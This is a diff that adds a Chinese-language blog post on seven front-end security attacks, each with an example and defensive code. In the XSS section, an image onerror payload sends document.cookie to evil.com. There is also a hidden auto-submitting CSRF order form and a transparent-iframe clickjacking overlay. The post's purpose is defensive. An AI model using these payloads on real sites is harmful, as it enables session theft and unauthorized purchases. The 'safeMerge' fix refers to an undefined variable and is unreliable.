@@ -1,0 +1,272 @@
+---
+type: "Post"
+title: "7 种前端安全攻击解析"
+date: "2024-01-06"
+description: "深入剖析前端开发中常见的 7 种安全攻击类型，包含原理、示例与防御措施，助你打造更安全的 Web 应用。"
+keywords: "前端安全, XSS, CSRF, 点击劫持, SQL 注入, 原型链污染, 文件上传漏洞, Web 安全"
+author: "晓龙"
+image: "/images/hero/frontend-security.jpg"
+tags: ["前端开发", "Web 安全", "JavaScript"]
+category: "前端技术"
+---
+
+在当今复杂的 Web 生态系统中，前端安全已经成为了一个不容忽视的话题。作为一名前端工程师，我曾多次在实际项目中遇到各种安全挑战。本文将结合我的实践经验，深入剖析 7 种最常见且危害严重的前端安全攻击，并分享一些实用的防御策略。
+
+## 1. 跨站脚本攻击 (XSS)
+
+### 原理解析
+
+XSS（Cross-Site Scripting）攻击堪称前端安全领域的"老大哥"。它通过在受信任的网站中注入恶意脚本，在用户浏览器中执行未经授权的代码。这就像是在一杯纯净水中滴入了一滴墨水 —— 看起来依然清澈，但已经被污染了。
+
+### 攻击类型
+
+在我的开发生涯中，遇到过三种主要的 XSS 变体：
+
+- **反射型 XSS**：最常见但也最容易防范，攻击代码从 URL 参数中反射到页面。
+- **存储型 XSS**：最具破坏性，恶意代码存储在服务器，影响所有访问者。
+- **DOM 型 XSS**：最隐蔽的变种，完全在浏览器端发生，不经过服务器。
+
+### 现实案例
+
+去年我参与的一个社交媒体项目就遭遇过存储型 XSS 攻击。用户评论功能允许插入 HTML 标签以支持富文本，攻击者利用这个特性注入了这样的代码：
+
+```javascript
+<img src="x" onerror="fetch('https://evil.com/steal?' + document.cookie)">
+```
+
+这段代码会在图片加载失败时，自动将用户的 Cookie 发送到攻击者的服务器。更可怕的是，这段代码会影响每个查看评论的用户。
+
+### 防御实践
+
+经过这次教训，我们采取了多层防御措施：
+
+```javascript
+// 1. 使用 DOMPurify 过滤用户输入
+import DOMPurify from 'dompurify';
+
+const sanitizedHTML = DOMPurify.sanitize(userInput, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
+  ALLOWED_ATTR: []
+});
+
+// 2. 设置严格的 CSP 策略
+// 在 HTML 头部或服务器响应头中
+Content-Security-Policy: script-src 'self'; object-src 'none';
+
+// 3. 使用安全的 DOM API
+const userContent = document.createTextNode(userInput);
+element.appendChild(userContent);
+```
+
+## 2. 跨站请求伪造 (CSRF)
+
+### 深入理解
+
+CSRF 攻击就像是冒用他人身份证 —— 攻击者利用用户的登录状态，在用户不知情的情况下执行未授权的操作。
+
+### 实战案例
+
+我曾经处理过一个电商平台的 CSRF 漏洞。攻击者通过在论坛发帖，嵌入了一个隐藏的表单：
+
+```html
+<form
+  id="attack-form"
+  action="https://shop.example.com/api/order"
+  method="POST"
+  style="display: none"
+>
+  <input name="productId" value="expensive-item" />
+  <input name="quantity" value="999" />
+</form>
+<script>
+  document.getElementById("attack-form").submit();
+</script>
+```
+
+用户只要浏览了这个帖子，就会在不知情的情况下购买大量商品。
+
+### 有效防御
+
+我们的解决方案包括：
+
+```javascript
+// 1. 实现 Double Submit Cookie 模式
+const csrfToken = Math.random().toString(36).slice(2);
+document.cookie = `csrf=${csrfToken}; SameSite=Strict`;
+
+// 2. 在请求头中加入 token
+const headers = new Headers({
+  "X-CSRF-Token": csrfToken,
+  "Content-Type": "application/json",
+});
+
+// 3. 验证请求来源
+if (!request.headers.get("Origin").startsWith("https://shop.example.com")) {
+  throw new Error("Invalid origin");
+}
+```
+
+## 3. 点击劫持 (Clickjacking)
+
+### 技术剖析
+
+点击劫持就像是魔术师的障眼法，用户以为点击了一个正常按钮，实际上点击的是一个隐藏的恶意元素。
+
+### 真实事件
+
+在一个支付系统项目中，我们发现竞争对手的网站通过 iframe 嵌入了我们的支付页面，并用一个"领取优惠券"的按钮覆盖在转账按钮上：
+
+```html
+<div class="fake-button" style="position: fixed; z-index: 1000;">
+  <button>点击领取 100 元优惠券</button>
+</div>
+<iframe
+  src="https://pay.example.com/transfer"
+  style="opacity: 0.0001;"
+></iframe>
+```
+
+### 安全加固
+
+我们采取了以下措施：
+
+```javascript
+// 1. 服务端设置 X-Frame-Options
+response.setHeader("X-Frame-Options", "DENY");
+
+// 2. 使用 CSP frame-ancestors 指令
+response.setHeader("Content-Security-Policy", "frame-ancestors 'none'");
+
+// 3. JavaScript 框架检测
+if (window.self !== window.top) {
+  window.top.location = window.self.location;
+}
+```
+
+## 4. SQL 注入（前端视角）
+
+### 前端防线
+
+虽然 SQL 注入主要是后端问题，但前端也是防御的第一道防线。我在一个内部管理系统中就发现了这样的隐患：
+
+```javascript
+// 危险的实现
+const searchAPI = `/api/users?query=${userInput}`;
+
+// 安全的实现
+const searchAPI = `/api/users?query=${encodeURIComponent(userInput)}`;
+const params = new URLSearchParams({
+  query: userInput,
+}).toString();
+
+// 使用参数化查询
+const response = await fetch("/api/users/search", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+  },
+  body: JSON.stringify({ query: userInput }),
+});
+```
+
+## 5. 原型链污染
+
+### 实战经验
+
+在一个基于 Vue.js 的项目中，我们遇到了一个棘手的原型链污染问题。攻击者通过 API 响应注入恶意数据：
+
+```javascript
+// 有漏洞的深拷贝实现
+function deepMerge(target, source) {
+  for (let key in source) {
+    if (typeof source[key] === "object") {
+      target[key] = deepMerge(target[key] || {}, source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+  return target;
+}
+
+// 修复后的实现
+function safeMerge(target, source) {
+  if (key === "__proto__" || key === "constructor") {
+    return target;
+  }
+  // ... 其他逻辑
+}
+
+// 更安全的方案：使用 Object.create(null)
+const safeObject = Object.create(null);
+```
+
+## 6. 文件上传漏洞
+
+### 实际案例
+
+在一个企业 CMS 系统中，我们的文件上传功能曾被黑客利用。他们上传了一个看似正常的图片文件：
+
+```javascript
+// 前端文件类型验证
+const allowedTypes = ["image/jpeg", "image/png", "image/gif"];
+const maxSize = 5 * 1024 * 1024; // 5MB
+
+function validateFile(file) {
+  if (!allowedTypes.includes(file.type)) {
+    throw new Error("不支持的文件类型");
+  }
+  if (file.size > maxSize) {
+    throw new Error("文件大小超出限制");
+  }
+
+  // 检查文件扩展名
+  const extension = file.name.split(".").pop().toLowerCase();
+  if (!["jpg", "jpeg", "png", "gif"].includes(extension)) {
+    throw new Error("不允许的文件扩展名");
+  }
+}
+```
+
+## 7. 第三方依赖安全
+
+### 现代化防御
+
+在一个大型企业项目中，我们建立了完整的依赖安全管理流程：
+
+```javascript
+// package.json
+{
+  "scripts": {
+    "preinstall": "npx npm-audit-ci",
+    "audit": "npm audit && snyk test"
+  },
+  "dependencies": {
+    // 锁定依赖版本
+    "lodash": "4.17.21"
+  }
+}
+
+// 自动化检查脚本
+const { execSync } = require('child_process');
+
+try {
+  execSync('npm audit --audit-level=high');
+  console.log('安全检查通过');
+} catch (error) {
+  console.error('发现高危漏洞，终止部署');
+  process.exit(1);
+}
+```
+
+## 总结与展望
+
+前端安全是一个永无止境的话题，攻防技术在不断进化。作为前端工程师，我们需要：
+
+1. 保持警惕，定期更新安全知识
+2. 在开发初期就考虑安全因素
+3. 建立完整的安全测试流程
+4. 时刻关注业界最新的安全漏洞和解决方案
+
+记住，安全不是一个人的责任，而是整个团队的义务。让我们一起构建更安全的 Web 世界！
+
+如果你对文章中的某个安全问题有更深入的见解或实践经验，欢迎在评论区分享讨论。同时，我也会持续更新这篇文章，分享更多前端安全领域的新知识。
